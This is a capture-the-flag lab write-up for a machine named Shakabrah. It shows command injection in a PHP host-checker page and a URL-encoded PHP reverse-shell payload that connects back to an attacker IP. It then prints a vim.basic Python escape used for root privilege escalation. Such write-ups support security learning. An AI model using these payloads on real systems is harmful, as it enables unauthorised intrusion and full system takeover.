Shakabrah

Target IP: 192.168.194.86

Scanning



Looks like only two TCP ports are open on the target machine: SSH and HTTP. I will start my enumeration with the HTTP application running on port 80.

Enumeration

Port 80: HTTP

Doing a directory search does not show anything useful other than the main page is index.php and it uses PHP.


We are presented the webpage above when we access the application on port 80. It looks like some sort of host checker. Maybe we can use command injection to exploit this web application?


After putting 127.0.0.1 inside the textfield and pressing Go, I get the result shown above.


It looks like the web application is vulnerable to command injection. Using the payload 127.0.0.1%3Bwhoami%3Bid%3Bls was successful as all commands were executed; the %3b is ;. Now we can use this vulnerability to gain a reverse shell connection.

Exploitation


And now I gained a foothold on the machine using the full URL payload below.
PHP URL-encoded payload used:php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.211%22%2C80%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
Full URL of the payload: http://192.168.194.86/?host=127.0.0.1;php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.211%22%2C80%29%3Bshell_exec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

Privilege Escalation

I stabilised my shell using the following command python3 -c 'import pty; pty.spawn("/bin/bash");' as the host machine had python3 installed.


Looks like we can use vim.basic to elevate our privileges to root.


This task has a nasty bug. After entering /usr/bin/vim.basic, I typed :py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p") to gain a root shell.
